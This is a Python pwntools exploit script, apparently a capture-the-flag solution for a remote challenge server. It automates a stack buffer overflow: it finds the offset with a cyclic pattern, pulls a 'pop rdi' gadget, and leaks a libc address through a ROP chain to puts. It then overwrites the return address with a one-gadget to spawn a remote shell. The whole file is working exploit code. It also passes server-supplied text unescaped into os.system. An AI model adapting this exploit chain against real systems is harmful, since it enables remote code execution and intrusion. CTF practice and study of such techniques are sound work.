#!/usr/bin/python
#(metantz)

from pwn import *
import os

context(arch='amd64', os='linux')

binary = './chall'
server = 'challs.xmas.htsp.ro'
port = 12002

proc = remote(server,port)

proc.readuntil("Content: b'")
bin = proc.readline().strip()[:-1]

os.system("echo -n "+bin+" > t.b64 && base64 -d t.b64 > chall && chmod +x chall && rm t.b64 ")

elf = ELF(binary)

proc2 = process(binary)
proc2.sendline(cyclic(0x200))
proc2.wait()
proc2.close()
core = proc2.corefile
stack = core.rsp
pattern = core.read(stack,4)
off = cyclic_find(pattern)

a = os.popen("echo bo |gdb -q chall -ex 'br * puts' -ex 'r' -ex 'bt' -ex 'quit' 2>/dev/null|grep main|awk -F '=' '{print $2}'|awk -F ',' '{print $1}'|uniq").read().strip()
main = int(a,16)

b = os.popen("ropper --file ./chall --search 'pop rdi' 2>/dev/null |awk -F ':' '{print $1}'| grep 0x").read().strip()[7:-4]
pop_rdi = int(b,16)

payload = "A"*off
payload += p64(pop_rdi)
payload += p64(elf.got["setvbuf"])
payload += p64(elf.plt["puts"])
payload += p64(main)

proc.readuntil("name? ")
proc.sendline(payload)
proc.readuntil("!\n")
proc.readline()

leaked = u64(proc.readline().strip().ljust(8,'\x00'))
log.info("leaked setvbuf_libc: "+hex(leaked))

libc = leaked - 0x0812f0
log.info("leaked libc: "+hex(libc))

system = libc + 0x04f440
log.info("leaked system: "+hex(system))

binsh = libc + 0x1b3e9a
log.info("leaked binsh: "+hex(binsh))

log.info("pop rdi;ret : " +hex(pop_rdi))
log.info("main: "+hex(main))

payload = "A"*off
payload += p64(libc +0x4f2c5)

proc.sendline(payload)

proc.interactive()

